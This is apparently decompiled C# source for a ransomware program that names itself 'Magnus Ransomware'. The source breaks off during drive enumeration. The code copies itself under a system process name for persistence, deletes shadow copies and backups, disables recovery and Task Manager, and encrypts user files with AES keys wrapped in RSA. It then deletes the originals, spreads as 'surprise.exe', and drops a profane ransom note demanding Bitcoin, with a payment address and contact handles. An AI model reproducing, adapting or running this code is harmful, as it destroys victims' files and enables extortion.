using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "READMEEEEEE!!!!.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"SUPRISE MOTHERFUCKER!", "", "All your files has been encrypted and breached by Magnus Ransomware", "This is a ransomware.", "What is a ransomware?", "A ransomware is a malware which encrypts all your files and you need a key or a special software which can decrypt all your files.", "", "Quantity to pay: 125$", "Payment method: BTC", "",
		"Want to talk?", "", "Contact me throught qTox or aTox", "My id is:", "732FAB4071B7B0A078DDE58D34349566FA90BB8F5458FEEA39D87DF090642E213E9595B69F99", "", "Dont have money?", "Well, in that case there isnt any solution :)", "If you are younger than 18 years then we will make an offer because in that case you will need to pay 25$", "",
		"Bitcoin address: bc1qhxtqxpatn4p8v0pt9n6l6e707tzf54fzqa8xxp", "", "When you paid then send a private messsenge to @anibaltlgram in telegram", "Then when you send a messenge you will need to send the link to blockchain.com of the payment then and only in that case you can decrypt all your files.", "", "Are we trusted?", "If you donnt trust us, its ok because then you will NEVER get your files back.", "", "This software is really new so for this date there isnt any solution.", "",
		"Are you sad?", "Its not our problem :)", "", "Want to donate?", "Bitcoin address: bc1qhxtqxpatn4p8v0pt9n6l6e707tzf54fzqa8xxp", "", "And remember YOU HAVE 48h Until the private key of the decryption key autodestructs :)", "", "PAY IN BITCOIN", "",
		"Bitcoin address: bc1qhxtqxpatn4p8v0pt9n6l6e707tzf54fzqa8xxp"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.get_CurrentInputLanguage().get_Culture().Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString()!.Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			string extension;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120L)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string value = array2[num];
				if (directory.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>qsWaS0EkU7YtQKmwudyOKtoyDwG9Yg95JmlygJP5q1PPpNehnTPnVaUdNr15UsJv1uKEPQnEgq+H6itsVl4M6QZoIntwV3eA8PaUrkRkHK1xu9rGd1yV7oSjPQqKj7FvL0jfav2dPAyKxlwxN1Gb92mnHHerSNyDYobB4Q1NTmkRkipHoYSz/NjW8C4GkMeggWi/ZApTu94oVSi+w13ajfGqLyQFezqGl7Rb+2yFJHBlvXtaQaxvzwzmQ2dU0WKQID5TMhKKhHCEy5Aqh7JNnfO4ABP8aRRk6r8dNyASnSSCh9NIDpe9rPRLXeTv7K7Gocv/z7mvaRMqAxK58v6UmQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
